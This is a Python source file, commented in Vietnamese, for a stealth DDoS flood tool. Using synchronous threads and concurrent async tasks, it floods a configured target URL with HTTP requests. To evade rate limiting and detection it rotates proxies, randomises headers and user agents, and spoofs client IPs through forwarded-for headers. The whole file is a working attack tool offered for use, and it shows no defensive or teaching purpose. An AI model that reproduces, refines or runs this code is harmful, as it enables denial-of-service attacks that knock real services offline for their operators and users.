import requests
import threading
import time
import signal
import sys
import random
import asyncio
import aiohttp
import multiprocessing
import itertools
import urllib3
from config import *
from proxy_fetcher import update_proxy_list, load_saved_proxies

# Tắt SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Biến global
stop_threads = False
request_count = 0
success_count = 0
error_count = 0
request_lock = threading.Lock()
proxy_list = []
proxy_cycle = None
last_proxy_refresh = 0

def signal_handler(sig, frame):
    global stop_threads
    print('\n🛑 Đang dừng chương trình...')
    stop_threads = True
    sys.exit(0)

def refresh_proxies():
    """Refresh danh sách proxy"""
    global proxy_list, proxy_cycle, last_proxy_refresh
    
    current_time = time.time()
    if current_time - last_proxy_refresh < PROXY_REFRESH_INTERVAL:
        return
    
    print("🔄 Refreshing proxy list...")
    
    if USE_FRESH_PROXIES:
        new_proxies = update_proxy_list()
        if new_proxies:
            proxy_list = new_proxies
        else:
            # Fallback to saved proxies
            proxy_list = load_saved_proxies()
            if not proxy_list:
                proxy_list = BACKUP_PROXIES
    else:
        proxy_list = load_saved_proxies()
        if not proxy_list:
            proxy_list = BACKUP_PROXIES
    
    if proxy_list:
        proxy_cycle = itertools.cycle(proxy_list)
        print(f"✅ Updated proxy list with {len(proxy_list)} proxies")
    
    last_proxy_refresh = current_time

def get_random_headers():
    """Tạo headers ngẫu nhiên để tránh bị phát hiện"""
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice([
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
            'application/json,text/plain,*/*',
        ]),
        'Accept-Encoding': random.choice([
            'gzip, deflate, br',
            'gzip, deflate',
            'gzip',
        ]),
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store', 'must-revalidate']),
        'Pragma': 'no-cache',
        'DNT': '1',
    }
    
    # Thêm Accept-Language nếu được bật
    if ENABLE_ACCEPT_LANGUAGE:
        headers['Accept-Language'] = random.choice(ACCEPT_LANGUAGES)
    
    # Thêm Sec-Fetch headers nếu được bật
    if ENABLE_SEC_HEADERS:
        headers.update({
            'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script', 'style']),
            'Sec-Fetch-Mode': random.choice(['navigate', 'cors', 'no-cors', 'same-origin']),
            'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site', 'same-site']),
            'Sec-Fetch-User': random.choice(['?1', '?0']),
        })
    
    # Thêm headers giả mạo IP nếu được bật
    if ROTATE_IP_HEADERS:
        fake_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        ip_headers = random.choice([
            {'X-Forwarded-For': fake_ip},
            {'X-Real-IP': fake_ip},
            {'X-Originating-IP': fake_ip},
            {'X-Remote-IP': fake_ip},
            {'X-Client-IP': fake_ip},
            {'CF-Connecting-IP': fake_ip},
            {'True-Client-IP': fake_ip},
            {'X-Forwarded-For': fake_ip, 'X-Real-IP': fake_ip},
            {'X-Forwarded-For': f"{fake_ip}, {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"},
        ])
        headers.update(ip_headers)
    
    # Thêm referer ngẫu nhiên nếu được bật
    if ENABLE_REFERER and random.choice([True, False]):
        headers['Referer'] = random.choice(REFERERS)
    
    # Thêm một số headers ngẫu nhiên khác
    if random.choice([True, False]):
        headers['X-Requested-With'] = 'XMLHttpRequest'
    
    if random.choice([True, False]):
        headers['Origin'] = random.choice(REFERERS)
    
    return headers

def get_random_proxy():
    """Lấy proxy ngẫu nhiên từ danh sách"""
    if not USE_PROXIES or not proxy_cycle:
        return None
    
    try:
        proxy_url = next(proxy_cycle)
        return {'http': proxy_url, 'https': proxy_url}
    except:
        return None

def apply_delay():
    """Áp dụng delay ngẫu nhiên nếu được bật"""
    if USE_DELAYS:
        delay = random.uniform(MIN_DELAY, MAX_DELAY)
        time.sleep(delay)

def generate_random_params():
    """Tạo parameters ngẫu nhiên"""
    if not RANDOMIZE_PARAMS:
        return {}
    
    params = {
        't': int(time.time() * 1000),
        'r': random.randint(1, 999999),
        'cache_bust': random.randint(1, 999999),
        'v': random.choice(['1.0', '2.0', '3.0', '4.0']),
        'ref': random.randint(1, 9999),
        'sid': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16)),
    }
    
    # Thêm một số params ngẫu nhiên
    if random.choice([True, False]):
        params['utm_source'] = random.choice(['google', 'facebook', 'twitter', 'direct'])
    
    if random.choice([True, False]):
        params['lang'] = random.choice(['en', 'vi', 'zh', 'ja', 'ko'])
    
    return params

def send_request_sync():
    """Gửi request đồng bộ với session để tái sử dụng kết nối"""
    global request_count, success_count, error_count
    session = requests.Session()
    
    # Tối ưu session
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=20,
        pool_maxsize=20,
        max_retries=0
    )
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    while not stop_threads:
        try:
            # Refresh proxy nếu cần
            refresh_proxies()
            
            # Áp dụng delay trước khi gửi request
            apply_delay()
            
            headers = get_random_headers()
            proxies = get_random_proxy()
            params = generate_random_params()
            
            # Random method và path
            method = random.choice(HTTP_METHODS) if RANDOMIZE_METHODS else 'GET'
            path = random.choice(ATTACK_PATHS) if RANDOMIZE_PATHS else '/'
            url = TARGET_URL + path if not TARGET_URL.endswith('/') else TARGET_URL[:-1] + path
            
            # Cấu hình request
            request_kwargs = {
                'headers': headers,
                'params': params,
                'timeout': (CONNECT_TIMEOUT, READ_TIMEOUT),
                'allow_redirects': True,
                'verify': False,
                'stream': False,
            }
            
            if proxies:
                request_kwargs['proxies'] = proxies
            
            # Gửi request theo method
            if method == 'GET':
                response = session.get(url, **request_kwargs)
            elif method == 'POST':
                data = {
                    'data': random.randint(1, 999999),
                    'action': random.choice(['search', 'login', 'submit', 'update', 'query']),
                    'token': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32)),
                    'timestamp': int(time.time()),
                }
                request_kwargs['data'] = data
                response = session.post(url, **request_kwargs)
            elif method == 'HEAD':
                response = session.head(url, **request_kwargs)
            else:  # OPTIONS
                response = session.options(url, **request_kwargs)
            
            # Cập nhật thống kê
            with request_lock:
                request_count += 1
                if response.status_code < 400:
                    success_count += 1
                else:
                    error_count += 1
                
                if request_count % LOG_FREQUENCY == 0:
                    proxy_info = ""
                    if SHOW_PROXY_INFO and proxies:
                        proxy_info = f" via {list(proxies.values())[0]}"
                    
                    success_rate = (success_count / request_count * 100) if request_count > 0 else 0
                    print(f"🔥 #{request_count} | {method} {path} | {response.status_code} | Success: {success_rate:.1f}%{proxy_info}")
                    
        except requests.exceptions.ProxyError:
            with request_lock:
                error_count += 1
            continue
        except requests.exceptions.Timeout:
            with request_lock:
                error_count += 1
            continue
        except requests.exceptions.RequestException:
            with request_lock:
                error_count += 1
            continue
        except Exception:
            with request_lock:
                error_count += 1
            continue

async def send_request_async(session):
    """Gửi request bất đồng bộ"""
    global request_count, success_count, error_count
    
    try:
        # Áp dụng delay async
        if USE_DELAYS:
            await asyncio.sleep(random.uniform(MIN_DELAY, MAX_DELAY))
        
        headers = get_random_headers()
        params = generate_random_params()
        
        # Random path cho async requests
        path = random.choice(ATTACK_PATHS) if RANDOMIZE_PATHS else '/'
        url = TARGET_URL + path if not TARGET_URL.endswith('/') else TARGET_URL[:-1] + path
        
        # Cấu hình timeout cho async
        timeout = aiohttp.ClientTimeout(total=READ_TIMEOUT, connect=CONNECT_TIMEOUT)
        
        async with session.get(url, headers=headers, params=params, timeout=timeout, ssl=False) as response:
            with request_lock:
                request_count += 1
                if response.status < 400:
                    success_count += 1
                else:
                    error_count += 1
                
                if request_count % LOG_FREQUENCY == 0:
                    success_rate = (success_count / request_count * 100) if request_count > 0 else 0
                    print(f"⚡ Async #{request_count} | {path} | {response.status} | Success: {success_rate:.1f}%")
                    
    except asyncio.TimeoutError:
        with request_lock:
            error_count += 1
    except aiohttp.ClientError:
        with request_lock:
            error_count += 1
    except Exception:
        with request_lock:
            error_count += 1

async def async_attack():
    """Tấn công bất đồng bộ với nhiều request cùng lúc"""
    connector = aiohttp.TCPConnector(
        limit=100,
        limit_per_host=100,
        ttl_dns_cache=300,
        use_dns_cache=True,
        keepalive_timeout=30,
        enable_cleanup_closed=True,
        ssl=False
    )
    timeout = aiohttp.ClientTimeout(total=READ_TIMEOUT, connect=CONNECT_TIMEOUT)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        while not stop_threads:
            # Tạo nhiều task cùng lúc
            tasks = []
            for _ in range(CONCURRENT_REQUESTS):
                if stop_threads:
                    break
                task = asyncio.create_task(send_request_async(session))
                tasks.append(task)
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            
            # Thêm delay giữa các batch
            if USE_DELAYS:
                await asyncio.sleep(random.uniform(BATCH_DELAY_MIN, BATCH_DELAY_MAX))

def run_async_attack():
    """Chạy tấn công bất đồng bộ trong thread riêng"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(async_attack())
    except Exception:
        pass
    finally:
        loop.close()

def main():
    global stop_threads
    
    # Đăng ký signal handler để bắt Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    print("🥷🥷🥷 STEALTH DDoS - ANTI-DETECTION MODE 🥷🥷🥷")
    print(f"🎯 Target: {TARGET_URL}")
    print("=" * 60)
    print("📊 Configuration:")
    print(f"   - Sync Threads: {NUM_THREADS}")
    print(f"   - Async Threads: {ASYNC_THREADS}")
    print(f"   - Concurrent Requests: {CONCURRENT_REQUESTS}")
    print(f"   - Proxy Usage: {'ENABLED' if USE_PROXIES else 'DISABLED'}")
    print(f"   - Fresh Proxies: {'ENABLED' if USE_FRESH_PROXIES else 'DISABLED'}")
    print(f"   - Random Delays: {MIN_DELAY}s - {MAX_DELAY}s")
    print(f"   - IP Header Rotation: {'ENABLED' if ROTATE_IP_HEADERS else 'DISABLED'}")
    print(f"   - Path Randomization: {'ENABLED' if RANDOMIZE_PATHS else 'DISABLED'}")
    print(f"   - Method Randomization: {'ENABLED' if RANDOMIZE_METHODS else 'DISABLED'}")
    print("=" * 60)
    
    # Khởi tạo proxy list
    refresh_proxies()
    
    threads = []
    
    # Tạo các thread đồng bộ
    print(f"🔥 Starting {NUM_THREADS} synchronous threads...")
    for i in range(NUM_THREADS):
        thread = threading.Thread(target=send_request_sync, name=f"SyncThread-{i+1}")
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    # Tạo các thread bất đồng bộ
    print(f"⚡ Starting {ASYNC_THREADS} asynchronous threads...")
    for i in range(ASYNC_THREADS):
        thread = threading.Thread(target=run_async_attack, name=f"AsyncThread-{i+1}")
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    print(f"✅ Started {len(threads)} total threads")
    print("🚀 Attack initiated! Press Ctrl+C to stop...")
    print("=" * 60)
    
    # Thống kê real-time
    start_time = time.time()
    last_count = 0
    
    try:
        while not stop_threads:
            time.sleep(2)
            current_time = time.time()
            elapsed = current_time - start_time
            current_count = request_count
            rps = (current_count - last_count) / 2
            
            if SHOW_DETAILED_STATS:
                success_rate = (success_count / current_count * 100) if current_count > 0 else 0
                error_rate = (error_count / current_count * 100) if current_count > 0 else 0
                print(f"📈 Total: {current_count} | RPS: {rps:.1f} | Success: {success_rate:.1f}% | Errors: {error_rate:.1f}% | Time: {elapsed:.1f}s")
            else:
                print(f"📈 Requests: {current_count} | RPS: {rps:.1f} | Time: {elapsed:.1f}s")
            
            last_count = current_count
            
    except KeyboardInterrupt:
        print("\n🛑 Stopping attack...")
        stop_threads = True
    
    # Thống kê cuối
    total_time = time.time() - start_time
    avg_rps = request_count / total_time if total_time > 0 else 0
    success_rate = (success_count / request_count * 100) if request_count > 0 else 0
    
    print("=" * 60)
    print("📊 FINAL STATISTICS:")
    print(f"   Total Requests: {request_count}")
    print(f"   Successful: {success_count} ({success_rate:.1f}%)")
    print(f"   Errors: {error_count}")
    print(f"   Duration: {total_time:.2f} seconds")
    print(f"   Average RPS: {avg_rps:.2f}")
    print("🏁 Attack completed!")

if __name__ == "__main__":
    main()